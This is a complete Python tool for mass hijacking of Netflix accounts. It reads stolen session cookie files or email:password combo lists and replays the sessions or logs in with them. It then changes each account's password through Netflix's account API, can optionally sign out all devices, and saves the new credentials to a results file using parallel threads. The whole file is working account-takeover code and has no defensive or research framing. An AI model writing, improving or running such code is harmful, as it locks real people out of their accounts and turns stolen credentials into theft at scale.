#!/usr/bin/env python3
import os, sys, re, glob, json, time, uuid, threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style

init(autoreset=True)

try:
    from curl_cffi import requests
    CURL_CFFI = True
except ImportError:
    import requests
    CURL_CFFI = False

LOCK = threading.Lock()

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
RESULT_DIR = os.path.join(BASE_DIR, 'data', 'results-password-setter')

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}

API_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Content-Type': 'application/json',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Origin': 'https://www.netflix.com',
    'Referer': 'https://www.netflix.com/password',
}


def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.RED + Style.BRIGHT + r'''
 ███▄    █   █████▒██▓███   ██▓    ▄▄▄     ▓██   ██▓
 ██ ▀█   █ ▓██   ▒▓██░  ██▒▓██▒   ▒████▄    ▒██  ██▒
▓██  ▀█ ██▒▒████ ░▓██░ ██▓▒▒██░   ▒██  ▀█▄   ▒██ ██░
▓██▒  ▐▌██▒░▓█▒  ░▒██▄█▓▒ ▒▒██░   ░██▄▄▄▄██  ░ ▐██▓░
▒██░   ▓██░░▒█░   ▒██▒ ░  ░░██████▒▓█   ▓██▒ ░ ██▒▓░
░ ▒░   ▒ ░  ▒ ░   ▒▓▒░ ░  ░░ ▒░▓  ░▒▒   ▓▒█░  ██▒▒▒
░ ░░   ░ ▒░ ░     ░▒ ░     ░ ░ ▒  ░ ▒   ▒▒ ░▓██ ░▒░
   ░   ░ ░  ░ ░   ░░         ░ ░    ░   ▒   ▒ ▒ ░░
         ░                     ░  ░     ░  ░░ ░
                                            ░ ░''' + Fore.RED + Style.DIM + '''
                        Password Setter''' + Style.RESET_ALL)


def parse_cookie_file(path):
    email = None
    nfid = None
    snfid = None
    with open(path, 'r', errors='ignore') as f:
        for raw_line in f:
            line = raw_line.strip()
            if not line or line.startswith('#'):
                continue
            em = re.match(r'^[\u2013\-]\s*Email:\s*(.+)', line, re.UNICODE)
            if em:
                email = em.group(1).strip()
                continue
            parts = [p.strip() for p in line.split('\t')]
            if len(parts) >= 7 and parts[0].endswith('.netflix.com'):
                if parts[5] == 'NetflixId':
                    nfid = parts[6]
                elif parts[5] == 'SecureNetflixId':
                    snfid = parts[6]
    if not email:
        basename = os.path.basename(path).replace('.txt', '')
        em = re.search(r'\[([^\]]+@[^\]]+)\]', basename)
        if em:
            email = em.group(1)
    return email or 'unknown', nfid, snfid


def parse_email_pass_file(path):
    accounts = []
    with open(path, 'r', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if not line or ':' not in line:
                continue
            parts = line.split(':', 1)
            email = parts[0].strip()
            password = parts[1].strip()
            if '@' in email and password:
                accounts.append((email, password))
    return accounts


def collect_accounts(path):
    if os.path.isfile(path):
        files = [path]
    else:
        files = sorted(glob.glob(os.path.join(path, '*.txt')))
    cookie_accounts = []
    email_pass_accounts = []
    for f in files:
        content = open(f, 'r', errors='ignore').read(4096)
        if re.search(r'(?:NetflixId|SecureNetflixId)', content):
            email, nfid, snfid = parse_cookie_file(f)
            cookie_accounts.append((email, nfid, snfid, f))
        elif re.search(r'@.*:', content):
            ep = parse_email_pass_file(f)
            email_pass_accounts.extend(ep)
    return cookie_accounts, email_pass_accounts


def verify_session(session):
    try:
        r = session.get('https://www.netflix.com/password', headers=HEADERS, timeout=20)
        if r.status_code != 200:
            return False, r.status_code
        if 'login' in r.url.lower():
            return False, 'redirected'
        return True, r.text
    except Exception as e:
        return False, str(e)


def extract_client_id(html):
    m = re.search(r'<meta\s+name="netflix\.request\.client"[^>]+content="([^"]+)"', html)
    if m:
        return m.group(1)
    m = re.search(r'"X-Netflix-Request-Client"\s*:\s*"([^"]+)"', html)
    if m:
        return m.group(1)
    m = re.search(r'netflix\.(?:request\.client|client\.request)\s*[=:]\s*"([^"]+)"', html)
    if m:
        return m.group(1)
    m = re.search(r'window\.netflix\s*=\s*window\.netflix\s*\|\|\s*\{\};\s*window\.netflix\.request\s*=\s*\{[^}]*client\s*:\s*"([^"]+)"', html)
    if m:
        return m.group(1)
    return None


def has_current_password(html):
    return 'currentPassword' in html


def has_new_password(html):
    return 'newPassword' in html


def login_with_credentials(email, password):
    session = requests.Session()
    session.headers.update(HEADERS)
    try:
        r = session.get('https://www.netflix.com/login', headers=HEADERS, timeout=15)
        auth_url = ''
        m = re.search(r'"authURL"\s*:\s*"([^"]*)"', r.text)
        if m:
            auth_url = m.group(1)
        login_headers = {
            'User-Agent': HEADERS['User-Agent'],
            'Content-Type': 'application/json',
            'Accept': 'application/json,text/html,application/xhtml+xml',
            'Origin': 'https://www.netflix.com',
            'Referer': 'https://www.netflix.com/login',
        }
        payload = json.dumps({"email": email, "password": password, "authURL": auth_url})
        r2 = session.post('https://www.netflix.com/login', data=payload, headers=login_headers, timeout=15)
        if r2.status_code in (200, 204) and ('NetflixId' in session.cookies or 'nf_means_session' in r2.text):
            return session
        if r2.status_code == 302 and 'NetflixId' in session.cookies:
            return session
        cookies_set = any('NetflixId' in c.name for c in session.cookies)
        if cookies_set:
            return session
        return None
    except Exception:
        return None


def set_password_api(session, new_password, client_id, current_password=None):
    api_headers = {**API_HEADERS}
    if client_id:
        api_headers['X-Netflix-Request-Client'] = client_id
    guid = str(uuid.uuid4())
    api_headers['X-Netflix-Request-Guid'] = guid

    payload = {
        "password": new_password,
        "password2": new_password,
    }
    if current_password:
        payload["currentPassword"] = current_password

    try:
        r = session.post(
            'https://www.netflix.com/api/shakti/memberchange',
            json=payload,
            headers=api_headers,
            timeout=30
        )
        if r.status_code in (200, 201, 204):
            return True, 'OK'
        body = r.text[:500]
        if 'passwordTooWeak' in body or 'weakPassword' in body:
            return False, 'weak_password'
        if 'passwordTooShort' in body:
            return False, 'password_too_short'
        if 'currentPasswordMismatch' in body or 'wrongPassword' in body:
            return False, 'wrong_current_password'
        if 'sameAsCurrent' in body or 'passwordSameAsCurrent' in body:
            return False, 'same_as_current'
        return False, f'http_{r.status_code}: {body[:100]}'
    except Exception as e:
        return False, str(e)[:100]


def sign_out_all(session, client_id):
    api_headers = {**API_HEADERS}
    if client_id:
        api_headers['X-Netflix-Request-Client'] = client_id
    api_headers['X-Netflix-Request-Guid'] = str(uuid.uuid4())
    payload = {"action": "signOutAllDevices"}
    try:
        r = session.post(
            'https://www.netflix.com/api/shakti/memberchange',
            json=payload,
            headers=api_headers,
            timeout=30
        )
        return r.status_code in (200, 201, 204)
    except Exception:
        return False


def process_cookie_account(email, nfid, snfid, fpath, new_password, sign_out_all_flag):
    if not nfid:
        return email, 'error', 'no_netflixid'

    session = requests.Session()
    session.headers.update(HEADERS)
    session.cookies.set('NetflixId', nfid, domain='.netflix.com')
    if snfid:
        session.cookies.set('SecureNetflixId', snfid, domain='.netflix.com')

    ok, data = verify_session(session)
    if not ok:
        return email, 'error', f'session_dead: {data}'

    html = data
    has_cur = has_current_password(html)
    has_new = has_new_password(html)

    if has_cur and has_new:
        return email, 'skip', 'has_password_need_current'

    if not has_new:
        return email, 'error', 'password_page_unexpected'

    client_id = extract_client_id(html)

    success, reason = set_password_api(session, new_password, client_id)
    if not success:
        return email, 'error', reason

    if sign_out_all_flag:
        sign_out_all(session, client_id)

    return email, 'success', 'password_set'


def process_email_pass_account(email, password, new_password, sign_out_all_flag):
    session = login_with_credentials(email, password)
    if not session:
        return email, 'error', 'login_failed'

    ok, data = verify_session(session)
    if not ok:
        return email, 'error', f'session_dead: {data}'

    html = data
    client_id = extract_client_id(html)

    success, reason = set_password_api(session, new_password, client_id, current_password=password)
    if not success:
        return email, 'error', reason

    if sign_out_all_flag:
        sign_out_all(session, client_id)

    return email, 'success', 'password_changed'


def process_account(acct, new_password, sign_out_all_flag):
    if acct['type'] == 'cookie':
        return process_cookie_account(
            acct['email'], acct['nfid'], acct['snfid'], acct['path'],
            new_password, sign_out_all_flag
        )
    else:
        return process_email_pass_account(
            acct['email'], acct['password'], new_password, sign_out_all_flag
        )


def main():
    banner()

    threads = 4
    input_path = None
    i = 1
    while i < len(sys.argv):
        arg = sys.argv[i]
        if arg == '--threads' and i + 1 < len(sys.argv):
            threads = int(sys.argv[i + 1])
            i += 1
        elif arg == '--no-proxy':
            pass
        elif arg.startswith('--'):
            pass
        elif input_path is None:
            input_path = arg
        i += 1

    if not input_path:
        print(Fore.CYAN + '\n  Enter cookies folder or file path:' + Style.RESET_ALL)
        input_path = input(Fore.YELLOW + '  > ' + Style.RESET_ALL).strip()
        if not input_path:
            print(Fore.RED + '  No path provided.' + Style.RESET_ALL)
            sys.exit(1)

    if not os.path.exists(input_path):
        print(Fore.RED + f'  Path not found: {input_path}' + Style.RESET_ALL)
        sys.exit(1)

    print()
    new_password = input(Fore.YELLOW + '  Enter new password to set: ' + Style.RESET_ALL).strip()
    if not new_password:
        print(Fore.RED + '  Password cannot be empty.' + Style.RESET_ALL)
        sys.exit(1)
    if len(new_password) < 6:
        print(Fore.RED + '  Password must be at least 6 characters.' + Style.RESET_ALL)
        sys.exit(1)

    print()
    sign_out_input = input(Fore.YELLOW + '  Sign out all devices? (y/n): ' + Style.RESET_ALL).strip().lower()
    sign_out_all_flag = sign_out_input in ('y', 'yes')

    cookie_accts, email_pass_accts = collect_accounts(input_path)

    accounts = []
    for email, nfid, snfid, fpath in cookie_accts:
        accounts.append({
            'type': 'cookie', 'email': email,
            'nfid': nfid, 'snfid': snfid, 'path': fpath
        })
    for email, password in email_pass_accts:
        accounts.append({
            'type': 'login', 'email': email, 'password': password
        })

    if not accounts:
        print(Fore.RED + '\n  No accounts found (no cookie files or email:pass combos).' + Style.RESET_ALL)
        sys.exit(1)

    print(Fore.CYAN + f'\n  Accounts loaded: {len(accounts)}' + Style.RESET_ALL)
    print(Fore.CYAN + f'  Threads: {threads}' + Style.RESET_ALL)
    print(Fore.CYAN + f'  Sign out all devices: {sign_out_all_flag}' + Style.RESET_ALL)
    print(Fore.CYAN + '  ' + '\u2500' * 50 + Style.RESET_ALL)
    time.sleep(0.5)

    os.makedirs(RESULT_DIR, exist_ok=True)
    success_file = os.path.join(RESULT_DIR, 'password_set.txt')
    fail_file = os.path.join(RESULT_DIR, 'failed.txt')
    skip_file = os.path.join(RESULT_DIR, 'skipped.txt')

    results = {'success': 0, 'error': 0, 'skip': 0}
    t0 = time.time()

    def worker(acct):
        email, status, msg = process_account(acct, new_password, sign_out_all_flag)
        with LOCK:
            if status == 'success':
                results['success'] += 1
                with open(success_file, 'a') as f:
                    f.write(f'{email}:{new_password}\n')
                print(Fore.GREEN + f'  #{results["success"]+results["error"]+results["skip"]:>3} '
                      f'\u2705 {email:35s} | {msg}' + Style.RESET_ALL, flush=True)
            elif status == 'skip':
                results['skip'] += 1
                with open(skip_file, 'a') as f:
                    f.write(f'{email} | {msg}\n')
                print(Fore.YELLOW + f'  #{results["success"]+results["error"]+results["skip"]:>3} '
                      f'\u26A0 {email:35s} | {msg}' + Style.RESET_ALL, flush=True)
            else:
                results['error'] += 1
                with open(fail_file, 'a') as f:
                    f.write(f'{email} | {msg}\n')
                print(Fore.RED + f'  #{results["success"]+results["error"]+results["skip"]:>3} '
                      f'\u274C {email:35s} | {msg}' + Style.RESET_ALL, flush=True)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker, acct) for acct in accounts]
        for f in as_completed(futures):
            try:
                f.result()
            except Exception as e:
                with LOCK:
                    results['error'] += 1
                    print(Fore.RED + f'  \u274C ? | exception: {str(e)[:80]}' + Style.RESET_ALL, flush=True)

    elapsed = time.time() - t0
    print()
    print(Fore.CYAN + '  ' + '\u2550' * 50 + Style.RESET_ALL)
    print(Fore.CYAN + Style.BRIGHT + '  DONE' + Style.RESET_ALL)
    print(Fore.CYAN + '  ' + '\u2550' * 50 + Style.RESET_ALL)
    print(Fore.GREEN + f'  \u2705 Success: {results["success"]}' + Style.RESET_ALL)
    print(Fore.RED + f'  \u274C Failed:  {results["error"]}' + Style.RESET_ALL)
    print(Fore.YELLOW + f'  \u26A0 Skipped: {results["skip"]}' + Style.RESET_ALL)
    print(Fore.WHITE + f'  Time: {elapsed:.0f}s ({elapsed/60:.1f}min)' + Style.RESET_ALL)
    print(Fore.CYAN + f'  Results: {RESULT_DIR}/' + Style.RESET_ALL)
    print()


if __name__ == '__main__':
    main()
